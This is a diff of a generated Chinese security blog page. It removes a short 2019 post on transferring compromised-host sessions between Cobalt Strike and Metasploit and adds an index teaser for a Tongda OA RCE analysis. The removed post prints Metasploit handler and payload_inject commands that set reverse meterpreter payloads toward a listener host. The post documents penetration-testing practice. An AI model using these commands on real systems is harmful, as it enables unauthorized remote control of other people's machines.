@@ -22,7 +22,7 @@
     <meta name="description" content="">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>CS shell 与 Msf session 转换 · Yoga7xm&#39;s Blog</title>
+    <title>Yoga7xm&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/" >Yoga7xm&#39;s Blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">CS shell 与 Msf session 转换</a>
-            </div>
-    </div>
     
     <a class="home-link" href=/>Yoga7xm's Blog</a>
 </header>
@@ -231,74 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            CS shell 与 Msf session 转换
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class= post-intro-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "内网渗透">内网渗透</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">287</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/05/10</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -399,64 +338,68 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.metasploit.com/" target="_blank" rel="noopener">MSF</a>和<a href="https://www.cobaltstrike.com" target="_blank" rel="noopener">CS</a>均为后渗透利用的神器，2.0时期的CS虽然基于MSF，但是3.0后已经作为一个独立的平台，但是对MSF的支持还不错</p>
-<h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><h3 id="CS-To-Msf-Session"><a href="#CS-To-Msf-Session" class="headerlink" title="CS To Msf Session"></a>CS To Msf Session</h3><p>先起一个监听器，然后再搞个后门，拿到一个上线机器，想要将其转给Msf Session</p>
-<p><strong>步骤：</strong></p>
-<ol>
-<li>MSF利用Handler模块开启监听</li>
-</ol>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;handler -p windows/meterpreter/reverse_tcp -H 192.168.1.101 -P 8899 -x</span><br></pre></td></tr></table></figure>
+            <main class="main index-page">
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href = "/2020/04/08/tongda/" >
+            
+                <span>通达OA 11.x RCE 漏洞分析</span>
+        </a>
+        <div class="abstract-content">
+            Abstract今年通达爆出了两个大漏洞，一个是文件包含+任意文件上传导致RCE、另一个是任意用户登陆，这两个都是前台直接可以打的大漏洞。
+影响范围
 
-<ol start="2">
-<li>CS中在目标机器上新增一个会话，并且新增一个监听器，使用<code>windows/foreign/reverse_http</code>，端口与MSF一致，选中后大概一分钟之后返回Shell</li>
-</ol>
-<p><img src="/2019/05/10/cs2msf/cs2msf.png" alt></p>
-<h3 id="MSF-Session-To-CS"><a href="#MSF-Session-To-CS" class="headerlink" title="MSF Session To CS"></a>MSF Session To CS</h3><p>MSF获得一个Session后，将其转给CS</p>
-<p><strong>步骤：</strong></p>
-<p>MSF获得Session之后，使用<code>exploit/windows/local/payload_inject</code>模块就好了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">PAYLOAD =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span> </span><br><span class="line">DisablePayloadHandler =&gt; <span class="literal">true</span></span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> LHOST 192.168.1.101</span><br><span class="line">LHOST =&gt; 192.168.1.101</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> LPORT 9999</span><br><span class="line">LPORT =&gt; 9999</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf5 exploit(windows/<span class="built_in">local</span>/payload_inject) &gt; exploit</span><br></pre></td></tr></table></figure>
+任意文件上传
 
-<p>这里设置端口和主机得与CS监听器一致，而且<strong>Payload不要用x64</strong></p>
-<p><img src="/2019/05/10/cs2msf/msf2cs.png" alt></p>
 
+v11.3 
+2017 
+2016 
+2015 
+2013 增强版 
+2013 
+
+
+文件包含
+
+
+V11.3
+2017
+
+
+任意用户登陆
+
+
+2017
+v11.x &lt; v11.5 支持扫码登录版本。
+
+环境搭建
+我这里用的是v11.3 For Windows版，下载下来之后是一个EXE文件，然后安装就好了，但是源码部分是经过Zend5.4加密过的，需要手工去解密
+漏洞分析任意文件上传网上流传的POC是ispiri...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/08</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" target="_blank" rel="noopener" data-tags = "php">php</a>
+    
+</div>
+            
+        </div>
     </article>
-    <!-- license  -->
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2019/05/15/disable/" title= "disable_funcions Bypass">
-                    <div class="nextTitle">disable_funcions Bypass</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/04/29/lPentest-domain/" title= "内网渗透--横向移动(委派与中继)">
-                    <div class="prevTitle">内网渗透--横向移动(委派与中继)</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -541,24 +484,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#转换"><span class="toc-number">2.</span> <span class="toc-text">转换</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CS-To-Msf-Session"><span class="toc-number">2.1.</span> <span class="toc-text">CS To Msf Session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-Session-To-CS"><span class="toc-number">2.2.</span> <span class="toc-text">MSF Session To CS</span></a></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2000,8 +1925,6 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
-    
-        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
